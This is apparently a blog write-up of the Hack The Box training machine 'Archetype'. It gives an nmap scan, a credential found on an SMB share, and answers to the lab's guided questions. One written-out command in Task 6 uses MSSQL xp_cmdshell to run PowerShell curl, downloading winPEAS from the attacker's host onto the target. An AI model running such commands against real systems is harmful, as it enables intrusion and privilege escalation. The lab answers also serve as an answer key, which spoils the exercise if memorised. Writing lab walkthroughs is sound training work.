---

title: HTB [Archtype]

date: 2022-09-25 01:28:05 +0200

categories: [windows,smb,mssql,winpeas]

tags: [HTB Starting point]

---

## Archtype

![](https://i.imgur.com/CL1WkMf.png)

### Nmap scan

```js
Nmap scan report for 10.129.94.188
Host is up (0.43s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ssl-date: 2022-09-25T04:12:07+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-09-25T03:57:39
|_Not valid after:  2052-09-25T03:57:39
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| ms-sql-info:
|   10.129.94.188:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h24m00s, deviation: 3h07m52s, median: 0s
| smb2-time:
|   date: 2022-09-25T04:11:48
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-09-24T21:11:52-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.48 seconds
```

#### Task 1
**Which TCP port is hosting a database server?**

`1433`


#### Task 2
**What is the name of the non-Administrative share available over SMB?**

`backups`

![](https://i.imgur.com/YXuztRL.png)



#### Task 3
**What is the password identified in the file on the SMB share?**

`M3g4c0rp123`

![](https://i.imgur.com/dXMtYoU.png)

![](https://i.imgur.com/0IzxCI2.png)

you can find a password in that `prod.dtsConfig` file



#### Task 4

**What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?**

that's `mssqlclient.py`


#### Task 5

**What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?**

`xp_cmdshell`

![](https://i.imgur.com/Iq7zVka.png)
- you need to `enable_xp_cmdshell` in order to use it  
- you can find more info about mssql enumeration [here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)



#### Task 6

**What script can be used in order to search possible paths to escalate privileges on Windows hosts?**

`winpeas`

- Now let's start a python server in local to transfer the winpeas to the machine

```powershell
xp_cmdshell "powershell -c curl -o C:\Users\sql_svc\Downloads\priv.exe http://10.10.16.18/winPEASx86.exe"
```


#### Task 7

**What file contains the administrator's password?**

`ConsoleHost_history.txt`

- Run winpeas

![](https://i.imgur.com/YLmlvFH.png)
- Let's look into this file

![](https://i.imgur.com/mFI3Klu.png)

- Now login with evil winrm and submit the flags

![](https://i.imgur.com/eTyzVOT.png)

- That's all!!
